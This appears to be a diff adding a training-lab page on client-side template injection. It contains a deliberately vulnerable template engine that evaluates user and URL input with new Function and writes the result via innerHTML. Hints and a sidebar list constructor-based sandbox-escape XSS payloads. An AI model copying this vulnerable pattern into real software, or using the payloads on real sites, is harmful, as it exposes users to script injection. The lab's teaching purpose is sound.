@@ -1,0 +1,124 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Lab: Client-Side Template Injection - Advanced Level 4</title>
+  <link rel="stylesheet" href="/css/style.css">
+</head>
+<body class="lab-page">
+  <div class="lab-toolbar">
+    <a href="/dashboard">&larr; Back to Dashboard</a>
+    <div class="lab-info">
+      <span class="lab-name">Advanced #4: Client-Side Template Injection</span>
+      <span class="difficulty hard">Hard</span>
+    </div>
+  </div>
+  <div id="solve-banner" class="solve-banner"></div>
+  <div class="lab-content">
+    <div class="lab-sidebar">
+      <h3>Objective</h3>
+      <div class="objective">
+        <p>Execute <code>alert('XSS')</code> by exploiting a client-side template engine. The page uses <code>{{ }}</code> template delimiters to evaluate expressions. Inject a template expression that escapes the sandbox and runs arbitrary JavaScript.</p>
+      </div>
+      <h3>Hints</h3>
+      <div class="hint-section">
+        <button class="hint-btn" onclick="toggleHint(this)">Hint 1: Template syntax</button>
+        <div class="hint-content">The template engine evaluates expressions inside <code>{{ }}</code>. Try <code>{{7*7}}</code> — if it renders <code>49</code>, the engine is evaluating your input as code. The engine provides access to a limited scope, but you can escape it.</div>
+        <button class="hint-btn" onclick="toggleHint(this)">Hint 2: Escaping the sandbox</button>
+        <div class="hint-content">Inside the template, <code>this</code> refers to the template context. But <code>constructor</code> gives you access to the Function constructor: <code>{{constructor.constructor('return this')()}}</code> gets you the global <code>window</code> object.</div>
+        <button class="hint-btn" onclick="toggleHint(this)">Hint 3: Payload</button>
+        <div class="hint-content">Try: <code>{{constructor.constructor('alert(1)')()}}</code> — This creates a new Function with your code and immediately calls it. Alternatively: <code>{{this.alert('XSS')}}</code> if the context has window access, or use the URL: <code>?greeting={{constructor.constructor('alert("XSS")')()}}</code></div>
+      </div>
+      <h3>Vulnerable Code</h3>
+      <div class="source-code">
+<pre><span class="comment">// Simple template engine</span>
+<span class="keyword">function</span> <span class="function">renderTemplate</span>(tpl, ctx) {
+  <span class="keyword">return</span> tpl.replace(
+    /\{\{(.+?)\}\}/g,
+    (_, expr) => {
+      <span class="keyword">try</span> {
+        <span class="keyword">return</span> <span class="sink">new Function</span>(
+          'ctx',
+          'with(ctx){return ' + expr + '}'
+        )(ctx);
+      } <span class="keyword">catch</span>(e) { <span class="keyword">return</span> ''; }
+    }
+  );
+}
+</pre>
+      </div>
+    </div>
+    <div class="lab-app">
+      <div style="max-width:700px;margin:40px auto">
+        <div class="lab-form">
+          <h2 style="margin-bottom:16px">&#128396; Greeting Card Builder</h2>
+          <p style="font-size:13px;color:var(--text-secondary);margin-bottom:12px">Create personalized greeting cards using our template engine. Use <code>{{name}}</code> and <code>{{date}}</code> for dynamic content.</p>
+          <label>Template (use {{expressions}})</label>
+          <textarea id="templateInput" rows="3" placeholder="Hello {{name}}, today is {{date}}!">Hello {{name}}, welcome to our platform!</textarea>
+          <label>Name</label>
+          <input type="text" id="nameInput" value="Guest">
+          <button class="btn btn-primary" onclick="renderCard()">Render Card</button>
+          <p style="font-size:11px;color:var(--text-muted);margin-top:4px">Tip: You can also use the URL parameter: <code>?greeting=your template here</code></p>
+        </div>
+        <div style="margin-top:16px">
+          <h3 style="font-size:14px;color:var(--text-muted);margin-bottom:8px">Rendered Output:</h3>
+          <div id="card-output" class="vuln-output" style="min-height:60px;font-size:16px;padding:24px;text-align:center">
+            <p style="color:var(--text-muted)">Click "Render Card" to see the result...</p>
+          </div>
+        </div>
+        <div style="margin-top:20px;padding:16px;background:var(--bg-card);border:1px solid var(--border);border-radius:12px">
+          <p style="font-size:13px;color:var(--text-secondary)"><strong>Real-world context:</strong> Client-Side Template Injection (CSTI) affects frameworks like AngularJS (<code>{{constructor.constructor('alert(1)')()}}</code>), Vue.js (v-html), and custom template engines. If user input reaches a template expression context, the attacker can escape the sandbox and achieve XSS. AngularJS CSTI was a common HIGH-severity finding in bug bounty programs.</p>
+          <p style="font-size:13px;color:var(--text-secondary);margin-top:8px"><strong>Common CSTI payloads:</strong></p>
+          <ul style="font-size:12px;color:var(--text-muted);padding-left:20px;margin-top:4px">
+            <li>AngularJS: <code>{{constructor.constructor('alert(1)')()}}</code></li>
+            <li>Vue.js: <code>{{_c.constructor('alert(1)')()}}</code></li>
+            <li>Generic: <code>{{this.constructor.constructor('alert(1)')()}}</code></li>
+          </ul>
+        </div>
+      </div>
+    </div>
+  </div>
+  <script src="/js/app.js"></script>
+  <script>
+    setupLabVerification('adv-4', 'xss');
+
+    // Simple template engine (VULNERABLE)
+    function renderTemplate(tpl, ctx) {
+      return tpl.replace(/\{\{(.+?)\}\}/g, function(match, expr) {
+        try {
+          // VULNERABLE: new Function with user-controlled expression
+          var fn = new Function('ctx', 'with(ctx){return ' + expr + '}');
+          return fn(ctx);
+        } catch(e) {
+          return '<span style="color:var(--danger)">[Error: ' + e.message + ']</span>';
+        }
+      });
+    }
+
+    function renderCard() {
+      var tpl = document.getElementById('templateInput').value;
+      var name = document.getElementById('nameInput').value;
+      var ctx = {
+        name: name,
+        date: new Date().toLocaleDateString(),
+        greeting: 'Hello'
+      };
+      var result = renderTemplate(tpl, ctx);
+      document.getElementById('card-output').innerHTML = result;
+    }
+
+    // Check URL param
+    var params = new URLSearchParams(location.search);
+    var greeting = params.get('greeting');
+    if (greeting) {
+      document.getElementById('templateInput').value = greeting;
+      var ctx = {
+        name: params.get('name') || 'Guest',
+        date: new Date().toLocaleDateString(),
+        greeting: 'Hello'
+      };
+      document.getElementById('card-output').innerHTML = renderTemplate(greeting, ctx);
+    }
+  </script>
+</body>
+</html>
